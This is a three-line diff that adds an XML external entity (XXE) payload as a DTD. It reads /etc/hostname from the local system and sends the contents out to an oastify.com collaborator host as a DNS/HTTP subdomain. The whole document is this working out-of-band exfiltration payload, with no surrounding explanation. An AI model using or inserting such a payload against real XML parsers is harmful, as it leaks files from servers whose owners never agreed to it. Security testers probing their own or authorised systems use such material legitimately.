@@ -1,0 +1,3 @@
+<!ENTITY % file SYSTEM "file:///etc/hostname">
+<!ENTITY % host SYSTEM "http://%file;.h9r3glg0xjm77trnzcrwhivt8keb251tq.oastify.com/">
+%host;
